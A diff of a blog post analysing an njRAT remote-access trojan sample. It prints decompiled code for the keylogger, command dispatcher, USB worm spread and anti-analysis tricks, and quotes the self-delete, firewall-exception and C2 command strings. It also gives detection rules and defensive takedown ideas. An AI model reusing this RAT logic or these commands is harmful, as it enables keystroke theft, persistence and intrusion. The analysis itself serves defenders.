@@ -6,16 +6,16 @@ categories: [malware-reversing, threat-intel]
 tags: [njrat, bladabindi, dotnet, rat, keylogger, usb-worm, static-analysis, yara]
 image:
   path: /assets/images/social/njrat-analysis-2026.jpg
-description: "Static analysis of a novel njRAT v0.7d im523 build with 'HacKed' campaign tag: C2 config extraction, 30+ command dispatch mapping, USB worm propagation, and credential theft — with reproducible Python tooling and YARA rules."
+description: "Static analysis of a novel njRAT v0.7d im523 build with 'HacKed' campaign tag: C2 config extraction, 30+ command dispatch mapping, USB worm propagation, and credential theft, with reproducible Python tooling and YARA rules."
 ---
 
-I was doing my usual morning triage run when this one caught my eye — a 37-kilobyte PE sitting at the top of the queue with a perfect risk score. Tiny file. Maximum threat rating. No family match in our similarity engine. No public reporting anywhere.
+I was doing my usual morning triage run when this one caught my eye, a 37-kilobyte PE sitting at the top of the queue with a perfect risk score. Tiny file. Maximum threat rating. No family match in our similarity engine. No public reporting anywhere.
 
-At 37KB for a full-featured RAT, I figured it was either a loader stub or something stripped down to essentials. Turns out it was neither. It's a complete njRAT v0.7d build — keylogger, screen capture, webcam enumeration, remote shell, USB worm propagation, a DDoS module, credential theft, 30+ C2 commands — all packed into something smaller than most icons on your desktop. And the operator didn't even bother to obfuscate it. Every class name, every method, every config string is sitting there in plaintext waiting to be read.
+At 37KB for a full-featured RAT, I figured it was either a loader stub or something stripped down to essentials. Turns out it was neither. It's a complete njRAT v0.7d build, keylogger, screen capture, webcam enumeration, remote shell, USB worm propagation, a DDoS module, credential theft, 30+ C2 commands, all packed into something smaller than most icons on your desktop. And the operator didn't even bother to obfuscate it. Every class name, every method, every config string is sitting there in plaintext waiting to be read.
 
-The C2 domain — `phishing[.]multimilliontoken[.]org` — had zero hits on VirusTotal, MalwareBazaar, and Hybrid Analysis when I pulled the sample. The compilation timestamp puts this build at April 4th, just four days before I got to it. Fresh infrastructure, fresh build, campaign tag "HacKed." Someone spun this up recently and it was actively beaconing behind Cloudflare when the sandboxes ran it.
+The C2 domain. `phishing[.]multimilliontoken[.]org`, had zero hits on VirusTotal, MalwareBazaar, and Hybrid Analysis when I pulled the sample. The compilation timestamp puts this build at April 4th, just four days before I got to it. Fresh infrastructure, fresh build, campaign tag "HacKed." Someone spun this up recently and it was actively beaconing behind Cloudflare when the sandboxes ran it.
 
-This write-up walks through the full reversing: extracting the configuration, tracing the C2 protocol, decompiling every command handler, and mapping the Win32 API calls to their actual behavior. Every code snippet shown here comes directly from ILSpy decompilation and was verified against the binary — no paraphrasing, no guessing.
+This write-up walks through the full reversing: extracting the configuration, tracing the C2 protocol, decompiling every command handler, and mapping the Win32 API calls to their actual behavior. Every code snippet shown here comes directly from ILSpy decompilation and was verified against the binary, no paraphrasing, no guessing.
 
 ---
 
@@ -23,9 +23,9 @@ This write-up walks through the full reversing: extracting the configuration, tr
 
 For readers who aren't deep into .NET malware:
 
-- **njRAT (Bladabindi)**: one of the most widely deployed RATs globally, first seen in 2013. Open-source VB.NET implant with a builder GUI that lets operators configure C2, persistence, and campaign tags without writing code. It's commodity malware, but it works — and 13 years later, it's still showing up in active campaigns.
+- **njRAT (Bladabindi)**: one of the most widely deployed RATs globally, first seen in 2013. Open-source VB.NET implant with a builder GUI that lets operators configure C2, persistence, and campaign tags without writing code. It's commodity malware, but it works, and 13 years later, it's still showing up in active campaigns.
 - **im523**: the internal version string for this build. njRAT versions follow the pattern `imXXX` where the number tracks the builder revision.
-- **|'|'|**: njRAT's C2 message separator. Every command and response over the wire is delimited with this five-character string. It's essentially the family's signature — if you see `|'|'|` in a TCP stream, you're looking at njRAT.
+- **|'|'|**: njRAT's C2 message separator. Every command and response over the wire is delimited with this five-character string. It's essentially the family's signature, if you see `|'|'|` in a TCP stream, you're looking at njRAT.
 
 ---
 
@@ -46,7 +46,7 @@ For readers who aren't deep into .NET malware:
 
 **Identification**: njRAT v0.7d (Bladabindi), build `im523`, campaign tag "HacKed". Compiled 4 days before first observation.
 
-**Scope**: This analysis is primarily static — decompilation, string extraction, PE parsing. Dynamic sandbox results from two independent services were used to confirm C2 connectivity and are documented in the appendix. I did not interact with the C2 server directly.
+**Scope**: This analysis is primarily static, decompilation, string extraction, PE parsing. Dynamic sandbox results from two independent services were used to confirm C2 connectivity and are documented in the appendix. I did not interact with the C2 server directly.
 
 ---
 
@@ -73,10 +73,10 @@ The njRAT builder embeds configuration as plaintext UTF-16LE strings in the .tex
 | **Masquerade** | `svchost.exe`, `Exsample.exe` | Process name spoofing |
 | **Persistence** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Registry Run key |
 | **Anti-analysis thread** | `True` (`task`) | Enable `mgr.protect()` analysis tool monitor |
-| **File relocation** | `False` (`Idr`) | Do not copy self to %TEMP% — run from current location |
+| **File relocation** | `False` (`Idr`) | Do not copy self to %TEMP%, run from current location |
 | **BSoD protection** | `False` (`BD`) | ProcessBreakOnTermination disabled in this build |
 
-The configuration is stored as public static fields at the top of the `OK` class — fully visible in the decompiled source:
+The configuration is stored as public static fields at the top of the `OK` class, fully visible in the decompiled source:
 
 ```csharp
 // Decompiled from OK class — all config fields as static members
@@ -103,7 +103,7 @@ public class OK
 }
 ```
 
-No encryption, no encoding (except the Base64 campaign tag) — the operator's entire configuration is readable in plaintext from the binary.
+No encryption, no encoding (except the Base64 campaign tag), the operator's entire configuration is readable in plaintext from the binary.
 
 The config extractor script (`scripts/extract_njrat_config.py`) automates this extraction:
 
@@ -191,9 +191,9 @@ public static bool Sendb(byte[] b)
 }
 ```
 
-- **No encryption** — all C2 traffic is plaintext, trivially detectable with IDS
-- **Port 443** — abuses HTTPS port to evade basic port-based filtering, but the protocol is not TLS
-- **Client ID** — the MD5 mutex value (`411e31664bdd9d96369d0a44d5111aef`)
+- **No encryption**, all C2 traffic is plaintext, trivially detectable with IDS
+- **Port 443**, abuses HTTPS port to evade basic port-based filtering, but the protocol is not TLS
+- **Client ID**, the MD5 mutex value (`411e31664bdd9d96369d0a44d5111aef`)
 
 ## Class and Method Architecture
 
@@ -201,14 +201,14 @@ The binary is unobfuscated VB.NET with 4 classes:
 
 | Class | Purpose | Key Methods |
 |---|---|---|
-| `w.A` | **Entry point only** — calls `OK.ko()` | `main()` |
-| `w.OK` | **Everything else** — C2 connection, command dispatch, persistence, config, all functionality | `ko()` (boot), `connect()`, `Send()`/`Sendb()`, `Ind()` (dispatch), `INS()` (install), `RC()` (receive), `Plugin()`, `pr()`, `inf()`, `UNS()`, `HWD()`, `ACT()` |
+| `w.A` | **Entry point only**, calls `OK.ko()` | `main()` |
+| `w.OK` | **Everything else**. C2 connection, command dispatch, persistence, config, all functionality | `ko()` (boot), `connect()`, `Send()`/`Sendb()`, `Ind()` (dispatch), `INS()` (install), `RC()` (receive), `Plugin()`, `pr()`, `inf()`, `UNS()`, `HWD()`, `ACT()` |
 | `w.kl` | **Keylogger** — captures keystrokes via polling | `WRK()` (main loop), `VKCodeToUnicode()`, `Fix()`, `AV()` |
 | `w.mgr` | **Anti-analysis** — detects and disrupts analysis tools | `protect()` (main loop), `GetChild()`, `EnumChild()` |
 
 ---
 
-## Command Dispatch — Decompiled
+## Command Dispatch. Decompiled
 
 The `OK.Ind()` method is the central command dispatcher. It splits the incoming C2 message on the `|'|'|` separator and matches the first token against a long if-else chain:
 
@@ -279,7 +279,7 @@ private static void Ind(byte[] b)
 }
 ```
 
-Note the **UDP flood (DDoS)** capability at the `udp` command (not `dos` — the `dos` command is a no-op that just sends an ack) — this turns infected machines into DDoS nodes, sending 4KB UDP packets at a configurable rate. Stopped via `udpstp`.
+Note the **UDP flood (DDoS)** capability at the `udp` command (not `dos`, the `dos` command is a no-op that just sends an ack), this turns infected machines into DDoS nodes, sending 4KB UDP packets at a configurable rate. Stopped via `udpstp`.
 
 30+ commands extracted from method names and string analysis:
 
@@ -293,10 +293,10 @@ Note the **UDP flood (DDoS)** capability at the `udp` command (not `dos` — the
 | **Screenshot** | `CAP` command in `Ind()` | `CopyFromScreen` → JPEG compress → send to C2 |
 | **Webcam Detect** | `Cam()` | Enumerate webcam drivers via `capGetDriverDescriptionA` |
 | **Keylogger** | `kl.WRK()` | `GetAsyncKeyState` polling + `VKCodeToUnicode` + window tracking |
-| **BSoD Protection** | `pr(int)` | `NtSetInformationProcess(ProcessBreakOnTermination)` — pr(1)=enable, pr(0)=disable |
+| **BSoD Protection** | `pr(int)` | `NtSetInformationProcess(ProcessBreakOnTermination)`, pr(1)=enable, pr(0)=disable |
 | **Boot Sequence** | `ko()` | Entry point: mutex → INS() → RC thread → keylogger → mgr → main loop |
 | **Anti-Analysis** | `mgr.protect()` | Kill taskmgr / Process Hacker / Process Explorer via UI manipulation |
-| **Plugin Loader** | `Plugin()` | `Assembly.Load(byte[])` — reflective .NET assembly loading from C2 |
+| **Plugin Loader** | `Plugin()` | `Assembly.Load(byte[])`, reflective .NET assembly loading from C2 |
 | **Get Registry Values** | `GTV()` | Read values from `HKCU\Software\<mutex>` subkey |
 | **Set Registry Values** | `STV()` | Write values to `HKCU\Software\<mutex>` subkey |
 | **Exit/Disconnect** | `ED()` | Calls `pr(0)` to remove BSoD protection |
@@ -305,8 +305,8 @@ Note the **UDP flood (DDoS)** capability at the `udp` command (not `dos` — the
 | **Logoff** | `logoff` | `shutdown -l -t 00` |
 | **Disable Keyboard/Mouse** | `DisableKM` | `apiBlockInput(True)` |
 | **Enable Keyboard/Mouse** | `EnableKM` | `apiBlockInput(False)` |
-| **Reverse Mouse** | `ReverseMouse` | `SwapMouseButton(256)` — any nonzero value swaps buttons |
-| **Normal Mouse** | `NormalMouse` | `SwapMouseButton(0)` — restore default |
+| **Reverse Mouse** | `ReverseMouse` | `SwapMouseButton(256)`, any nonzero value swaps buttons |
+| **Normal Mouse** | `NormalMouse` | `SwapMouseButton(0)`, restore default |
 | **Disable CMD** | `DisableCMD` | Registry policy modification |
 | **Enable CMD** | `EnableCMD` | Remove CMD restriction |
 | **Disable Registry Editor** | `DisableRegistry` | Registry policy |
@@ -329,7 +329,7 @@ Note the **UDP flood (DDoS)** capability at the `udp` command (not `dos` — the
 | **Self-Delete** | `UNS` | `cmd.exe /k ping 0 & del` self-removal |
 | **Update** | `INS` variant | Download replacement, restart |
 | **Credential Theft** | `pas` command in `Ind()` | Download `Pass.exe` from Dropbox, read results from `temp.txt` |
-| **Critical Process** | `pr(1)` | `NtSetInformationProcess(ProcessBreakOnTermination)` — BSoD on kill |
+| **Critical Process** | `pr(1)` | `NtSetInformationProcess(ProcessBreakOnTermination)`. BSoD on kill |
 | **Firewall Bypass** | `inf` | `netsh firewall add allowedprogram` |
 
 ---
@@ -403,7 +403,7 @@ The actual boot order is: install marker → mutex → `INS()` (persistence + fi
 ![USB spread flow](/assets/images/posts/njrat/6_usb_spread.png)
 *Copy to all logical drives as svchost.exe → create autorun.inf → new host auto-executes → repeat*
 
-The USB spread code is inside `INS()` (gated by `if (!usb) return`), not a separate method. It iterates **all logical drives** returned by `Directory.GetLogicalDrives()` — not just removable drives:
+The USB spread code is inside `INS()` (gated by `if (!usb) return`), not a separate method. It iterates **all logical drives** returned by `Directory.GetLogicalDrives()`, not just removable drives:
 
 ```csharp
 // Decompiled from OK.INS() — USB worm spread section
@@ -422,17 +422,17 @@ foreach (string drive in logicalDrives)
 }
 ```
 
-Note: this copies to **all** logical drives (C:\, D:\, E:\, etc.), not just removable media — more aggressive than typical USB worms. Both the executable and autorun.inf are marked `Hidden`.
+Note: this copies to **all** logical drives (C:\, D:\, E:\, etc.), not just removable media, more aggressive than typical USB worms. Both the executable and autorun.inf are marked `Hidden`.
 
 ### Firewall Exception
 
-`netsh firewall add allowedprogram "server.exe" ENABLE` — adds the RAT as a firewall exception to allow inbound/outbound C2 connections.
+`netsh firewall add allowedprogram "server.exe" ENABLE`, adds the RAT as a firewall exception to allow inbound/outbound C2 connections.
 
 ---
 
 ## Deep Dive: Win32 API Usage
 
-### Keylogger — GetAsyncKeyState + MapVirtualKey + ToUnicodeEx
+### Keylogger. GetAsyncKeyState + MapVirtualKey + ToUnicodeEx
 
 ![Keylogger pipeline](/assets/images/posts/njrat/2_keylogger_pipeline.png)
 *Virtual key scan → keyboard layout → scan code → Unicode translation → active window tagging → registry persistence*
@@ -499,9 +499,9 @@ public void WRK()
 }
 ```
 
-Note `GetAsyncKeyState` returns `-32767` (`0x8001`) when a key is pressed — the high bit means "currently down" and the low bit means "pressed since last check." The `& !CtrlKeyDown` filter avoids logging Ctrl+C/Ctrl+V hotkeys (which would pollute the log with clipboard operations).
+Note `GetAsyncKeyState` returns `-32767` (`0x8001`) when a key is pressed, the high bit means "currently down" and the low bit means "pressed since last check." The `& !CtrlKeyDown` filter avoids logging Ctrl+C/Ctrl+V hotkeys (which would pollute the log with clipboard operations).
 
-The RAT calls this in a tight loop (`WRK` method) to detect which keys are currently held. This is a usermode technique — no kernel hook required, no `SetWindowsHookEx`, making it stealthier than hook-based keyloggers.
+The RAT calls this in a tight loop (`WRK` method) to detect which keys are currently held. This is a usermode technique, no kernel hook required, no `SetWindowsHookEx`, making it stealthier than hook-based keyloggers.
 
 **Step 2: Get keyboard layout with `GetKeyboardLayout`**
 
@@ -542,9 +542,9 @@ UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
 
 The RAT logs the translated character along with a timestamp and the foreground window title (captured via `GetForegroundWindow` + `GetWindowText`). Log entries look like: `[kl]2026/04/08 [Chrome - Google] hello world[ENTER]`.
 
-### Critical Process Protection — NtSetInformationProcess (ProcessBreakOnTermination)
+### Critical Process Protection. NtSetInformationProcess (ProcessBreakOnTermination)
 
-**Correction:** Initial sandbox reports labeled this as "anti-debug," but source code review reveals it's actually **critical process protection** — a denial-of-service anti-removal technique.
+**Correction:** Initial sandbox reports labeled this as "anti-debug," but source code review reveals it's actually **critical process protection**, a denial-of-service anti-removal technique.
 
 The `pr()` method calls `NtSetInformationProcess` with class **29 (`ProcessBreakOnTermination`)**, not ThreadHideFromDebugger:
 
@@ -576,14 +576,14 @@ public static void pr(int i)
 ```
 
 The RAT uses this in two contexts:
-- **`pr(1)`** at startup (when `BD = true` in config) — makes the RAT unkillable without BSoD
-- **`pr(0)`** before self-delete in `UNS()` — removes critical status so the process can safely exit
+- **`pr(1)`** at startup (when `BD = true` in config), makes the RAT unkillable without BSoD
+- **`pr(0)`** before self-delete in `UNS()`, removes critical status so the process can safely exit
 
-This is more destructive than anti-debug — it turns the RAT into a hostage. An analyst who kills the process crashes the entire system. AV products that terminate malware processes would also trigger a BSoD. The only safe removal path is to call `pr(0)` first, which requires either the C2 operator's cooperation or patching the process in memory.
+This is more destructive than anti-debug, it turns the RAT into a hostage. An analyst who kills the process crashes the entire system. AV products that terminate malware processes would also trigger a BSoD. The only safe removal path is to call `pr(0)` first, which requires either the C2 operator's cooperation or patching the process in memory.
 
-**Note:** The `DEB` method name in the decompiled source is misleading — it actually stands for "DEcode Base64" (`Convert.FromBase64String`), not "DEBug." The actual NtSetInformationProcess call is in the `pr()` method.
+**Note:** The `DEB` method name in the decompiled source is misleading, it actually stands for "DEcode Base64" (`Convert.FromBase64String`), not "DEBug." The actual NtSetInformationProcess call is in the `pr()` method.
 
-### Input Blocking — BlockInput
+### Input Blocking. BlockInput
 
 The `DisableKM` command locks out the user's keyboard and mouse:
 
@@ -605,9 +605,9 @@ BlockInput(TRUE);   // User can no longer type or move the mouse
 // or a reboot restores local control.
 ```
 
-This is particularly dangerous during credential theft operations — the attacker locks out the user to prevent interference while exfiltrating data.
+This is particularly dangerous during credential theft operations, the attacker locks out the user to prevent interference while exfiltrating data.
 
-### Mouse Manipulation — SwapMouseButton
+### Mouse Manipulation. SwapMouseButton
 
 ```c
 // Win32 API (user32.dll)
@@ -623,7 +623,7 @@ SwapMouseButton(TRUE);   // Left-click now right-clicks and vice versa
 SwapMouseButton(FALSE);  // Restore normal behavior
 ```
 
-### Monitor Control — SendMessage with SC_MONITORPOWER
+### Monitor Control. SendMessage with SC_MONITORPOWER
 
 ```c
 // Win32 API (user32.dll)
@@ -644,7 +644,7 @@ SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
 // Wakes the monitors back up.
 ```
 
-### Analysis Tool Killing — GetForegroundWindow + EnumChildWindows + SendMessage
+### Analysis Tool Killing. GetForegroundWindow + EnumChildWindows + SendMessage
 
 ![Anti-analysis flow](/assets/images/posts/njrat/4_anti_analysis.png)
 *200ms polling loop: detect analysis tool → enumerate child windows → find confirmation dialog → disable cancel button → relabel*
@@ -727,9 +727,9 @@ public void protect()
 }
 ```
 
-This is more subtle than simply killing the analysis tool — it manipulates the Task Manager's UI by disabling buttons and changing their labels, confusing the analyst.
+This is more subtle than simply killing the analysis tool, it manipulates the Task Manager's UI by disabling buttons and changing their labels, confusing the analyst.
 
-### Firewall Manipulation — netsh (confirmed by sandbox)
+### Firewall Manipulation, netsh (confirmed by sandbox)
 
 The sandbox captured `netsh.exe` (PID 5712) being spawned as a child process:
 
@@ -739,19 +739,19 @@ netsh firewall add allowedprogram "C:\Users\admin\Desktop\sample.exe" "sample.ex
 
 The sandbox also recorded the registry side-effect: netsh wrote to `HKCR\Local Settings\MuiCache` resolving the Windows Defender Firewall display name, confirming the firewall rule was actually created.
 
-### Self-Delete — Race Condition Technique
+### Self-Delete. Race Condition Technique
 
 ```batch
 cmd.exe /k ping 0 & del "C:\path\to\malware.exe" & exit
 ```
 
 This exploits a timing race:
-1. `ping 0` sends ICMP to `0.0.0.0` — on Windows this translates to pinging localhost, which takes ~4 seconds (4 retries with 1s timeout)
+1. `ping 0` sends ICMP to `0.0.0.0`, on Windows this translates to pinging localhost, which takes ~4 seconds (4 retries with 1s timeout)
 2. During those 4 seconds, the RAT process exits
 3. `del` then deletes the now-unlocked .exe
 4. `exit` closes the cmd.exe window
 
-The `&` operator chains commands sequentially in cmd.exe. The ping acts as a `sleep` — Windows cmd.exe has no native sleep command, so `ping` is the classic workaround.
+The `&` operator chains commands sequentially in cmd.exe. The ping acts as a `sleep`. Windows cmd.exe has no native sleep command, so `ping` is the classic workaround.
 
 ---
 
@@ -826,7 +826,7 @@ This is a secondary password recovery tool executed post-infection. The Dropbox 
 | T1555 | Credentials from Password Stores | Dropbox-hosted Pass.exe |
 | T1105 | Ingress Tool Transfer | Plugin download and execute |
 | T1070.004 | Indicator Removal: File Deletion | `ping 0 & del` self-delete |
-| T1620 | Reflective Code Loading | `Assembly.Load(byte[])` in Plugin() — fileless payload staging |
+| T1620 | Reflective Code Loading | `Assembly.Load(byte[])` in Plugin(), fileless payload staging |
 | T1036.005 | Masquerading: Match Legitimate Name | Drop as `svchost.exe` on USB drives |
 | T1095 | Non-Application Layer Protocol | Raw TCP on port 443 (not TLS) |
 | T1571 | Non-Standard Port | Custom protocol on standard HTTPS port |
@@ -889,39 +889,39 @@ alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
 )
 ```
 
-Note: njRAT sends plaintext on port 443 — any TLS inspection will immediately flag this as anomalous since there's no TLS handshake.
+Note: njRAT sends plaintext on port 443, any TLS inspection will immediately flag this as anomalous since there's no TLS handshake.
 
 ---
 
 ## Conclusion
 
-This 37KB njRAT v0.7d im523 variant is a textbook Bladabindi build with zero obfuscation — the operator relied entirely on the small file size and port 443 abuse for evasion rather than code protection. The "HacKed" campaign tag and `phishing[.]multimilliontoken[.]org` C2 domain are novel with no prior public reporting, suggesting a recently provisioned infrastructure.
+This 37KB njRAT v0.7d im523 variant is a textbook Bladabindi build with zero obfuscation, the operator relied entirely on the small file size and port 443 abuse for evasion rather than code protection. The "HacKed" campaign tag and `phishing[.]multimilliontoken[.]org` C2 domain are novel with no prior public reporting, suggesting a recently provisioned infrastructure.
 
-Despite its commodity nature, the sample packs an impressive density of capabilities into 37KB: keylogger, screen/webcam capture, remote shell, USB worm propagation, 20+ system control commands, anti-analysis tool detection, and a plugin system for deploying secondary payloads (including a Dropbox-hosted credential harvester). The plaintext C2 protocol on port 443 is trivially detectable — a single Suricata rule on the `|'|'|` separator will catch all njRAT v0.7d variants on the network.
+Despite its commodity nature, the sample packs an impressive density of capabilities into 37KB: keylogger, screen/webcam capture, remote shell, USB worm propagation, 20+ system control commands, anti-analysis tool detection, and a plugin system for deploying secondary payloads (including a Dropbox-hosted credential harvester). The plaintext C2 protocol on port 443 is trivially detectable, a single Suricata rule on the `|'|'|` separator will catch all njRAT v0.7d variants on the network.
 
-What makes this sample worth writing up isn't the malware itself — njRAT is commodity, well-documented, thirteen years old. It's the operational picture. A fresh build compiled four days before I found it, beaconing to a domain with zero public reporting, proxied through Cloudflare, with the campaign tag "HacKed." Someone is actively using this framework in 2026 with enough operational discipline to provision new infrastructure but not enough to obfuscate their implant.
+What makes this sample worth writing up isn't the malware itself, njRAT is commodity, well-documented, thirteen years old. It's the operational picture. A fresh build compiled four days before I found it, beaconing to a domain with zero public reporting, proxied through Cloudflare, with the campaign tag "HacKed." Someone is actively using this framework in 2026 with enough operational discipline to provision new infrastructure but not enough to obfuscate their implant.
 
-The plaintext C2 protocol on port 443 is trivially detectable — a single Suricata rule on the `|'|'|` separator will catch every njRAT v0.7d variant on the network. The real value of this analysis is the complete decompiled source mapping: every method name to its function, every config field to its purpose, every Win32 API call to its actual behavior. If you encounter an njRAT sample in your own triage, the deobfuscation is already done for you.
+The plaintext C2 protocol on port 443 is trivially detectable, a single Suricata rule on the `|'|'|` separator will catch every njRAT v0.7d variant on the network. The real value of this analysis is the complete decompiled source mapping: every method name to its function, every config field to its purpose, every Win32 API call to its actual behavior. If you encounter an njRAT sample in your own triage, the deobfuscation is already done for you.
 
 ---
 
 ## Code Weaknesses and Defensive Opportunities
 
-Reversing the decompiled source revealed several implementation flaws that defenders and incident responders can exploit. These aren't theoretical — they're verified against the actual code.
+Reversing the decompiled source revealed several implementation flaws that defenders and incident responders can exploit. These aren't theoretical, they're verified against the actual code.
 
-### The C2 Has Zero Authentication — Sinkhole and Mass-Uninstall
+### The C2 Has Zero Authentication. Sinkhole and Mass-Uninstall
 
-This is the big one. The entire C2 protocol is unauthenticated plaintext TCP. There is no TLS handshake, no challenge-response, no HMAC, no session token — nothing. The framing is just `<decimal_length>\0<UTF-8 payload>` with `|'|'|` delimiters.
+This is the big one. The entire C2 protocol is unauthenticated plaintext TCP. There is no TLS handshake, no challenge-response, no HMAC, no session token, nothing. The framing is just `<decimal_length>\0<UTF-8 payload>` with `|'|'|` delimiters.
 
 A defender who sinkoles `phishing[.]multimilliontoken[.]org` (via DNS or network controls) can stand up a listener on port 443 that:
 
 1. Accepts each bot's TCP connection
 2. Receives the `ll` identification beacon
-3. Sends back `un|'|'|~` — which triggers `UNS()`, the full uninstall sequence
+3. Sends back `un|'|'|~`, which triggers `UNS()`, the full uninstall sequence
 
 `UNS()` in the decompiled source (OK.cs) does everything an incident responder could want: calls `pr(0)` to remove BSoD protection, deletes the Registry Run key, removes the firewall exception, deletes the Startup folder copy, wipes the `HKCU\Software\<mutex>` registry subkey, and self-deletes via `cmd.exe /k ping 0 & del`. No authentication is checked. This is a one-command kill switch for every connected bot.
 
-### The Keylogger Has a Fatal Bug — Persistence Is Dead Code
+### The Keylogger Has a Fatal Bug. Persistence Is Dead Code
 
 This one surprised me. The `kl.WRK()` keylogger loop has a counter variable `num` that's supposed to trigger registry persistence every 1000 iterations:
 
@@ -938,11 +938,11 @@ while (true)
 }
 ```
 
-`num` is declared *inside* the `while(true)` loop and initialized to 1 on every iteration. It's never incremented. The `num == 1000` condition can never fire. This means **keylogs are never persisted to the registry** — they exist only in the `Logs` string in memory. If the RAT process crashes or is killed, all captured keystrokes are lost. The operator likely never noticed because the `kl` C2 command reads `Logs` from memory directly, so keylogs appear to work — they're just not crash-safe. This is a quality-of-life bug for defenders: a crash or reboot loses the attacker's keylog buffer entirely.
+`num` is declared *inside* the `while(true)` loop and initialized to 1 on every iteration. It's never incremented. The `num == 1000` condition can never fire. This means **keylogs are never persisted to the registry**, they exist only in the `Logs` string in memory. If the RAT process crashes or is killed, all captured keystrokes are lost. The operator likely never noticed because the `kl` C2 command reads `Logs` from memory directly, so keylogs appear to work, they're just not crash-safe. This is a quality-of-life bug for defenders: a crash or reboot loses the attacker's keylog buffer entirely.
 
 ### The Plugin System Enables Defender Code Injection
 
-The `Plugin()` method loads arbitrary .NET assemblies via `Assembly.Load(byte[])` with zero verification — no hash check, no signature, no sandboxing:
+The `Plugin()` method loads arbitrary .NET assemblies via `Assembly.Load(byte[])` with zero verification, no hash check, no signature, no sandboxing:
 
 ```csharp
 public static object Plugin(byte[] b, string c)
@@ -968,7 +968,7 @@ while (true && udp)
 }
 ```
 
-With a low `delay` value, this exhausts the OS handle table within minutes. An operator who uses the DDoS feature ironically destabilizes their own RAT. A defender who impersonates the C2 can trigger this deliberately: send `udp|'|'|127.0.0.1|'|'|1|'|'|0` to start a flood with zero delay against localhost — the RAT will burn through socket handles until it crashes, while the `udpstp` command to stop it requires getting another command through the now-congested TCP connection.
+With a low `delay` value, this exhausts the OS handle table within minutes. An operator who uses the DDoS feature ironically destabilizes their own RAT. A defender who impersonates the C2 can trigger this deliberately: send `udp|'|'|127.0.0.1|'|'|1|'|'|0` to start a flood with zero delay against localhost, the RAT will burn through socket handles until it crashes, while the `udpstp` command to stop it requires getting another command through the now-congested TCP connection.
 
 ### The Receive Buffer Has a Race Condition
 
@@ -980,11 +980,11 @@ thread.Start(b);
 thread.Join(100);       // if Ind() takes longer than 100ms, b gets overwritten
 ```
 
-If a second command arrives within 100ms, `b` is reassigned while the first command's `Ind()` is still reading from it. The `rn` (upload & execute), `inv` (plugin load), and `PLG` commands all do `memoryStream.Write(b, offset, b.Length - offset)` — with a corrupted `b`, the written data is garbled. A defender can exploit this by rapidly flooding commands to corrupt plugin loading or file execution, causing the RAT to write garbage to disk or load invalid assemblies.
+If a second command arrives within 100ms, `b` is reassigned while the first command's `Ind()` is still reading from it. The `rn` (upload & execute), `inv` (plugin load), and `PLG` commands all do `memoryStream.Write(b, offset, b.Length - offset)`, with a corrupted `b`, the written data is garbled. A defender can exploit this by rapidly flooding commands to corrupt plugin loading or file execution, causing the RAT to write garbage to disk or load invalid assemblies.
 
 ### All Stored Data Is Accessible to Any Local Process
 
-Every piece of RAT state — keylogs, plugin binaries, config values, victim identifier — is stored under `HKCU\Software\411e31664bdd9d96369d0a44d5111aef` with default permissions. Any process running as the same user can read it. For incident responders, this means:
+Every piece of RAT state, keylogs, plugin binaries, config values, victim identifier, is stored under `HKCU\Software\411e31664bdd9d96369d0a44d5111aef` with default permissions. Any process running as the same user can read it. For incident responders, this means:
 
 ```
 reg query HKCU\Software\411e31664bdd9d96369d0a44d5111aef
@@ -1004,13 +1004,13 @@ The sample was flagged by our automated triage pipeline and confirmed by two ind
 | [ANY.RUN](https://any.run/report/ff87cd932e25b024cd10042c186f252fdabdac2c4d4cbc67f89e457697ebbc71/53b4744e-dac1-4bb7-b798-687edc2aca99) | Malicious | njRAT detected via YARA + Suricata |
 | [Joe Sandbox](https://www.joesandbox.com/analysis/1894290/0/html) | 100/100 | njRAT detected, 94% ReversingLabs, 92% VirusTotal |
 
-AV classification: `ByteCode-MSIL.Backdoor.NjRAT` (ReversingLabs), `TR/ATRAPS.Gen` (Avira). Despite being "novel" in our MCRIT similarity engine (zero family match), the binary is well-detected by signature-based AV — the novelty was in the infrastructure (C2 domain), not the code.
+AV classification: `ByteCode-MSIL.Backdoor.NjRAT` (ReversingLabs), `TR/ATRAPS.Gen` (Avira). Despite being "novel" in our MCRIT similarity engine (zero family match), the binary is well-detected by signature-based AV, the novelty was in the infrastructure (C2 domain), not the code.
 
 ---
 
 ## Appendix B: Dynamic Sandbox Validation
 
-Two sandbox runs confirmed that the static analysis findings are consistent with runtime behavior. I did not interact with the C2 myself — these results come from automated detonation.
+Two sandbox runs confirmed that the static analysis findings are consistent with runtime behavior. I did not interact with the C2 myself, these results come from automated detonation.
 
 ### ANY.RUN (150-second run)
 
@@ -1027,9 +1027,9 @@ Two sandbox runs confirmed that the static analysis findings are consistent with
 
 | Finding | Value |
 |---|---|
-| C2 resolved | `104[.]21[.]50[.]193` (different Cloudflare IP — confirms DNS load balancing) |
+| C2 resolved | `104[.]21[.]50[.]193` (different Cloudflare IP, confirms DNS load balancing) |
 | Suricata | 1,000+ alerts (hit max), same SID 2021176 |
-| Sleep interception | 469,976 `Sleep` calls accelerated — the 1ms keylogger loop (`kl.WRK()`) is the cause |
+| Sleep interception | 469,976 `Sleep` calls accelerated, the 1ms keylogger loop (`kl.WRK()`) is the cause |
 | CPU | >49% — confirmed by the `Thread.Sleep(1)` tight polling loop |
 | Reconnect cadence | New TCP socket every ~2.3s (matches `connect()`'s `Thread.Sleep(2000)`) |
 
@@ -1046,13 +1046,13 @@ Joe Sandbox flagged several behaviors that are actually standard .NET CLR runtim
 | `"Hyper-V RAW"` in memory | Winsock provider string on all Win10+ hosts |
 | `OriginalFilename = mscorwks.dll` | .NET 2.0 CLR runtime DLL in process memory (PE has no version info) |
 
-This is a recurring problem when sandboxing .NET malware — the CLR's internal housekeeping triggers signatures designed for native code. Always cross-reference sandbox findings against the actual source before including them in a report.
+This is a recurring problem when sandboxing .NET malware, the CLR's internal housekeeping triggers signatures designed for native code. Always cross-reference sandbox findings against the actual source before including them in a report.
 
 ---
 
 ## Appendix C: Attribution Context
 
-Joe Sandbox's threat intel associates njRAT broadly with **AQUATIC PANDA**, **Earth Lusca**, **Operation C-Major**, and **The Gorgon Group** — groups with Middle East and South Asian operational nexus. The "HacKed" campaign tag and phishing-themed domain are consistent with script-level operators in this space, but attribution cannot be established from a single sample. njRAT's builder is widely leaked and used by actors across all sophistication levels.
